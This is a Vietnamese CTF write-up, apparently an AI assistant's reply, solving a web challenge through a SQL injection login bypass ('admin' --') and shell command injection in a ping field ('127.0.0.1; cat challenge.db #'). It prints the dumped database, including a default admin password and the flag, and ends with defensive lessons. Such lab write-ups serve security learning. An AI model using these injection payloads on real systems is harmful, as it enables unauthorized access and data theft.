Tuyệt vời\! Bạn đã đi đến bước cuối cùng rồi. Việc `cat challenge.db` trả về kết quả (dù là ký tự loằng ngoằng) nghĩa là bạn đã nắm trong tay toàn bộ dữ liệu của trang web.

Vì bạn xin **WU (Write-up) đầy đủ**, mình sẽ tổng hợp lại toàn bộ quá trình giải bài này từ đầu đến cuối để bạn có cái nhìn hệ thống nhé. Đây là quy trình chuẩn để bạn note lại kinh nghiệm cho các giải sau.

-----

### 🏁 WRITE-UP: CONNECTION TESTER (CTF WEB)

#### 1\. Recon & Phân tích ban đầu

  * **Mục tiêu:** Trang Login đơn giản.
  * **Dấu hiệu:** Code của "junior developers" thường mắc lỗi sơ đẳng về kiểm tra đầu vào.
  * **Thử nghiệm:** Nhập nháy đơn `'` vào username thấy lỗi hoặc hành vi lạ -\> Nghi ngờ **SQL Injection**.

#### 2\. Bước 1: Bypass Login (SQL Injection)

  * Ta cần đánh lừa câu lệnh SQL để đăng nhập mà không cần mật khẩu đúng.
  * **Payload:** `admin' --`
  * **Giải thích:** Dấu `'` đóng chuỗi username, dấu `--` comment bỏ phần kiểm tra password phía sau.
  * **Kết quả:** Đăng nhập thành công vào Dashboard với quyền Admin.

#### 3\. Bước 2: Khai thác lỗ hổng RCE (Command Injection)

  * **Chức năng:** "Connectivity Tool" (Ping/Test kết nối).
  * **Dấu hiệu:** Input là địa chỉ IP, backend có thể dùng `exec()` hoặc `system()` để gọi lệnh ping.
  * **Thử nghiệm:** Thêm dấu chấm phẩy `;` để nối lệnh.
  * **Payload thử:** `127.0.0.1; ls`
  * **Phát hiện:** Lệnh chạy được, nhưng server có cơ chế **tự động nối thêm dấu `...`** vào cuối lệnh, làm hỏng cú pháp các lệnh như `grep` hay đọc file.

#### 4\. Bước 3: Bypass Filter (Kỹ thuật Comment)

  * **Vấn đề:** Lệnh `cat flag.txt` biến thành `cat flag.txt...` -\> Lỗi "No such file".
  * **Giải pháp:** Dùng ký tự `#` (comment trong Linux shell) để ngắt bỏ phần đuôi `...` do server thêm vào.
  * **Payload:** `127.0.0.1; ls -la #` -\> Thành công, liệt kê được file `challenge.db`.

#### 5\. Bước 4: Lấy Flag (Data Extraction)

  * **Phân tích:**
      * File `flag.txt` là cú lừa (decoy).
      * Source code `server.js` cho thấy Web App dùng SQLite (`challenge.db`).
      * Lệnh `grep` bị hạn chế hoặc không tìm thấy chuỗi "pctf" (có thể do file binary).
  * **Hành động:** Dump toàn bộ nội dung database ra màn hình.
  * **Payload cuối cùng:**
    ```bash
    127.0.0.1; cat challenge.db #
    ```

    Kết quả:
    ```plaintext
    connecting to 127.0.0.1
    SQLite format 3@  .r�
    TA�T��tableflagsflagsCREATE TABLE flags (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key TEXT NOT NULL,
            value TEXT NOT NULL
        )P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�<�WtableusersusersCREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            name TEXT NOT NULL
        )
    ���useruserpassDemo User'adminchangemeAdministrator
    ���	flags	users
    �� =flagPCTF{C0nn3cti0n_S3cured}
    ```

> Flag: `PCTF{C0nn3cti0n_S3cured}`

-----

### Bài học kinh nghiệm (Defense)

Từ góc độ phòng thủ, bài này dạy chúng ta:

1.  **Input Validation:** Không bao giờ tin tưởng input người dùng. Phải sanitize kỹ các ký tự đặc biệt (`;`, `&`, `|`, `'`, `#`).
2.  **Parameterized Queries:** Dùng PreparedStatement để chặn SQL Injection thay vì cộng chuỗi.
3.  **Tránh hàm `exec`:** Hạn chế tối đa việc gọi lệnh hệ thống từ code Web. Nếu cần ping, hãy dùng thư viện native của ngôn ngữ thay vì gọi `exec("ping ...")`.

**Bạn có tìm thấy chuỗi Flag trong đống ký tự đó chưa? Nếu thấy rồi thì chúc mừng bạn đã pwned bài này\! 🚩**